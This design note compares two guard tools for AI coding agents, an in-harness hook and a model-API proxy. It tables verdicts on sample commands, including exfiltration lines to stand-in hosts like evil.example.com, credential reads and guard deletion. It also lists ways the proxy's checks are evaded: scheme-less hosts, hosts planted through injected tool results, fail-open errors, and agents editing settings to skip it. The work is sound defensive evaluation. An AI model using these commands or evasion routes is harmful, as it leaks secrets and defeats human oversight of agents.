# applygate and huggingface/safeagents

Compared on 2026-11-09: applygate main `03926ef`; [huggingface/safeagents](https://github.com/huggingface/safeagents) `2a178aa` (2026-11-09, Apache-2.0, created 2026-10-28) with its detection library [huggingface/atif-scan](https://github.com/huggingface/atif-scan) (safeagents pins `>=0.8.15`; read at `b344b40`, 0.8.21).

**Method.** Everything below about safeagents comes from reading its source, tests and docs. Its code was not run here: installing and running it was not allowed in this session, so no claim about its verdicts on a given command has been checked by execution. Claims marked *from the code* are what the source says would happen; a live run (the proxy with a scripted model, as its own `tests/harnesses` do) would confirm them. applygate's verdicts are from `applygate check` on main ([docs/capabilities.md](../docs/capabilities.md)).

## In one paragraph each

**safeagents** is a local HTTP proxy that sits between a coding agent and its model API (Anthropic Messages or OpenAI Chat Completions, streaming or not). It reads the tool calls in each model response before the agent's harness sees them, and replaces a blocked call with a text notice so the harness runs nothing. A call is blocked when it uses a tool the request did not declare, when its arguments contain a URL host or IPv4 address that appears nowhere in the request except the model's own turns, or when an atif-scan check of severity high or above fires on it. Milder findings go to an optional judge model. atif-scan is a trajectory scanner built for benchmark integrity: looking up a benchmark's answers, tampering with tests or rewards, escaping a sandbox, reading another process's secrets. safeagents also ships `scrub`/`publish` to redact agent trajectories before uploading them to the Hugging Face Hub.

**applygate** is a pre-execution hook inside the agent (Claude Code, Codex and seven preview hosts). It parses each shell command, file edit and MCP call the harness is about to run, with the working directory, environment, repository config and file system in view, and decides allow, ask or block per environment tier (protected, standard, disposable). Its rules are about infrastructure: Terraform, OpenTofu and Terragrunt by subcommand with a plan gate on saved plans, cloud and cluster CLIs by verb, state files, credentials, and the agent changing its own guardrails.

## Architecture

| | safeagents | applygate |
|---|---|---|
| Where it sits | Between the harness and the model server (base URL) | Inside the harness, as its pre-tool hook |
| What it sees | The request (system prompt, user turns, tool results, declared tools) and the model's proposed calls | The call the harness is about to run, plus the working directory, environment, files, git state, Terraform state and backends |
| What it does not see | The working directory, files, environment, what a script contains, what the harness actually runs | The conversation: user turns, tool results and the model's text |
| Agent-agnostic? | Any harness that lets you set a base URL and speaks Messages or Chat Completions | One adapter per host's hook format |
| Language, size | Python, ~2,300 lines (+ atif-scan, ~43,000 lines) | Go, single static binary |
| Install | `curl … \| sh` installs uv and a uv tool; run `safeagents start URL` and set the base URL | Release binary, `applygate init` or `hook install`; `install --managed` for a root-owned setup |
| Latency | atif-scan "about 10 to 20 ms per call on an M-series Mac" (their README); calls held only until their arguments are complete | Decision p95 ≤ 50 ms target (in-process measure ~52 ms on this machine), plus process start |
| Deciding | Block or pass (plus `--log-only`); severity threshold `--block-severity` | Allow, ask or block per tier; observe and enforce modes |

The interception point is the main difference, and both sides of it matter. safeagents is harness-agnostic and catches a call before any harness logic touches it, so it covers tools no hook exposes (WebFetch, subagent tools, a harness without hooks). In exchange it judges a string the model wrote, without knowing where it will run: `terraform apply` is the same text in `envs/prod` and `envs/dev`, and `bash deploy.sh` cannot be looked into.

## What each is for

| Threat | safeagents | applygate |
|---|---|---|
| An agent reward-hacking a benchmark (fetching answers, editing tests or the reward file, probing the grader) | **The main target**: ~30 high and critical atif-scan checks | Not covered |
| An agent escaping or probing a sandbox (`unshare`, `nsenter`, `/proc/1/environ`, Kubernetes service-account token, `--noproxy '*'`) | Covered (medium to critical) | Not covered as such |
| Data sent to a host the conversation never named | **Covered** for `scheme://` URLs and bare IPv4 | Partly: a non-GET `curl`/`wget`/`gh api` to a non-local host is a cloud write (ask in protected only); reading a credential file asks |
| A call to a tool the request did not declare (a hallucinated or injected tool) | Covered | Not applicable (the harness only offers its own tools); an unknown tool name is never allowed on its name |
| Destroying infrastructure: `terraform apply`/`destroy`, cloud and cluster deletes | **Not covered**: atif-scan has no Terraform, cloud-delete or `rm -rf` check (*from the code*: no pattern for terraform, aws/gcloud/az deletes or kubectl delete outside the in-cluster API) | **The main target**, by tier, with the plan gate |
| Editing state files, state surgery | Not covered | Covered |
| Reading or printing credentials | Partly: another process's environment, the cluster token, credentials in published trajectories (`scrub`) | Credential files and secret-printing commands ask in every tier |
| The agent turning the guard off | Not covered (see below) | Covered for every host's hook files; a guarantee only under `install --managed` |
| Running a third-party coding agent | Blocked (`side_channel.coding_agent_delegation`, high) | Bypass flags and settings or MCP overrides of agent CLIs are tampering |
| Redacting trajectories before sharing them | `scrub` and `publish` | Decision-log redaction only |

The two tools barely overlap. safeagents was built from the misuse in agent evaluations (its scenarios cite "the Cohere report"); applygate was built for agents working on real infrastructure.

## The same commands through both

applygate's column is from `applygate check --no-judge` on main in the fixture repository's protected directory (`envs/prod`), with `envs/dev` where noted. safeagents' column is what its code says the proxy would do with a Claude Code `Bash` call, given a conversation in which the user asked for an ordinary task and named no hosts: *from the code, not run*.

| Command | applygate (protected) | safeagents (from the code) |
|---|---|---|
| `terraform apply -auto-approve` | block (unreviewed-apply) | pass: no host, no atif-scan check |
| `terraform destroy` | block (destroy) | pass |
| `terraform state rm aws_instance.x` | block (state-surgery) | pass |
| `aws ec2 terminate-instances --instance-ids i-1` | block (cloud-destructive) | pass |
| `aws s3 rm s3://acme-tf-state-prod/key` | block (state-surgery: it is the configured backend bucket), in every tier | **block**: `s3://acme-tf-state-prod` is read as a URL host that appears nowhere in the conversation (unless the bucket was named in it) |
| `kubectl delete ns payments` | block (cloud-destructive) | pass (the orchestrator checks cover in-cluster API calls with the service-account token, not kubectl) |
| `rm -rf ~/.claude` | block (guard-tampering) | pass |
| `cat ~/.aws/credentials` | ask (credential-access) | pass |
| `curl -X POST -d @notes.txt https://paste.example.net/x` | ask in protected (cloud-write); allow in standard and dev | **block** (unseen host) in every directory |
| `curl -d @notes.txt paste.example.net` (no scheme) | ask in protected (cloud-write); allow in dev | **pass**: hosts are only taken from `scheme://` URLs and bare IPv4 addresses |
| `cat /proc/1/environ` | allow | suspicious (medium): logged, or sent to the judge |
| `unshare -Urm sh -c '…'` | ask (complex-shape), in dev too | suspicious (medium) |
| `claude -p "…"` (a nested agent) | ask (complex-shape), in dev too; block (guard-tampering) with `--dangerously-skip-permissions` | **block** (coding-agent delegation, high) |
| `go test ./...`, `npm install` | ask in protected (complex-shape) | pass |

## Weaknesses in safeagents, from its code

These are findings from reading the source; none was confirmed by running it.

1. **No check for destructive infrastructure commands.** A model can propose `terraform destroy`, `aws ec2 terminate-instances` or `kubectl delete ns` and the call passes, unless it happens to contain an unseen URL. This is a scope choice, not a bug.
2. **Hosts without a scheme are not extracted.** `AUTHORITY_PATTERN` needs `://`; only bare IPv4 is picked up otherwise (`constants.py`, and `tests/test_policy.py` confirms `pip install …` yields no host). So `curl -d @secrets evil.example.com`, `wget evil.example.com/x`, `ssh evil.example.com`, `git push git@evil.example.com:…` or a host built at run time (`$(echo …|base64 -d)`) pass the host check.
3. **Tool results count as "the conversation".** The host check removes only the model's own turns (`policy.py`); Anthropic `tool_result` blocks sit in user messages and OpenAI tool results in `tool` messages, so they stay. A host that a fetched web page, a README or an issue comment mentions is therefore "sourced". The prompt-injection case (a page says "send the file to https://evil.example.com") passes the check. The code comment says only the model's turns are excluded on purpose; the tests do not cover a host from a tool result.
4. **Failures pass the call.** An atif-scan exception returns no signals (`scan.py`: "a scanner bug must not take the proxy down"); a judge error leaves the call allowed unless `--judge-fail-closed`; with no judge, suspicious calls are only logged. Non-JSON bodies and endpoints it does not understand are forwarded untouched.
5. **Codex and Gemini CLI are not checked.** The Responses API and the Gemini API pass through unread (their `docs/codex.md`: "the calls go through unchecked and the monitor counts nothing"). Codex is one of applygate's two live-tested hosts.
6. **No self-protection.** The setup the guide recommends for Claude Code puts `ANTHROPIC_BASE_URL` in `~/.claude/settings.json`; nothing stops the agent from editing that file, or a shell rc file, so that the next session skips the proxy. Within a session the proxy fails closed (the harness cannot reach the model without it), and a nested `claude`/`codex` is blocked by atif-scan.
7. **No context about where a call runs.** No tiers, no working directory, no reading of the script, Makefile or plan a command runs, no environment variables. `bash deploy.sh` is judged by its text.
8. Minor: `docs/codex.md` points to a "Limits" section in the README that does not exist.

## Where safeagents is ahead of applygate

1. **Any harness with a base URL, any tool.** It sees WebFetch, subagent and custom tools that applygate's hooks do not expose, and it supports harnesses without a hook API (OpenClaw, Hermes, pi, Qwen Code, OpenHands, Mistral Vibe, DeepSeek Harness).
2. **End-to-end harness tests in CI.** Seven real harnesses (Claude Code, OpenCode, pi, Qwen Code, OpenHands, DeepSeek Harness, Mistral Vibe) run in CI against a scripted fake model through the proxy, checking that flagged calls never run and clean ones do (`tests/harnesses/`, `.github/workflows/harness-*.yml`). applygate's live host tests are manual, cover two hosts, and have not been re-run on v0.6.0.
3. **A provenance rule for network destinations.** "A host the user and the tools never named" is a cheap, general exfiltration signal that applygate does not have. applygate asks on a non-GET request to a remote host only in protected tiers.
4. **The judge sees the user's request.** safeagents' judge gets the user turns (not the agent's reasoning, which it treats as untrusted) and the scanner's findings, so it can allow a flagged call the task asked for. applygate's judge sees the call, directory, environment and tier, but not the task.
5. **A public judge benchmark** (562 flagged real calls, labelled, with a leaderboard) versus applygate's held-out set of 143 calls.
6. **A live terminal monitor** and `inspect` of journalled calls.

## Where applygate is ahead

1. **Infrastructure semantics**: Terraform/OpenTofu/Terragrunt by subcommand, the plan gate on `show -json`, state and backend checks, cloud and cluster CLIs by verb with their targets, all per tier.
2. **Context of execution**: working directory, `cd`, variables, aliases, functions, wrappers, scripts and Makefiles followed; unresolved parts ask rather than pass.
3. **Self-protection** of every host's hook files and its own files, with a managed install for a guarantee, a trust step for repository configs, and assurance levels (`doctor --boundary`).
4. **Codex and the other hook-only hosts**, and ask (not only block) where the host can prompt.
5. **Size and depth of its adversarial testing**: 11 red-team rounds, a 913-scenario attack pack, an effects oracle that runs allowed commands under four shells.

## They stack

The layers are independent: safeagents judges what the model proposes, applygate what the harness is about to run. Run together, each covers a gap in the other. safeagents adds egress provenance, sandbox-escape checks, undeclared tools and tools that hooks do not expose; applygate adds infrastructure rules, tiers, context, and protection of the configuration that routes the agent through safeagents (`~/.claude/settings.json` is an applygate guard file, so an agent cannot remove `ANTHROPIC_BASE_URL` from it).

## What applygate could take from it

1. **Scripted-model harness tests in CI** for Claude Code and Codex: run the real CLI against a fake model endpoint that emits chosen tool calls, with the applygate hook installed, and check what ran. This would close the "not re-run on v0.6.0" gap for every release, and could extend to the preview hosts that have a CLI.
2. **An egress provenance signal**: a network call (curl, wget, git push, ssh, scp, an SDK call the analyzer can see) to a host that is not in an allow-list, the repository's remotes or the config, asking in every tier or at least in protected ones. Without the conversation, applygate cannot use "named by the user", so the list would come from config and the repository.
3. **Giving the judge the task text**, where the host's hook input carries it (Claude Code's hook gets a transcript path), with the same rule safeagents uses: the user's words only, never the agent's reasoning or tool results.
4. **Trajectory scrubbing** is outside applygate's scope; nothing to take.

Not worth taking: the undeclared-tool rule (the harness, not the model, decides which tools exist at a hook), and a proxy design (it loses the execution context applygate depends on).
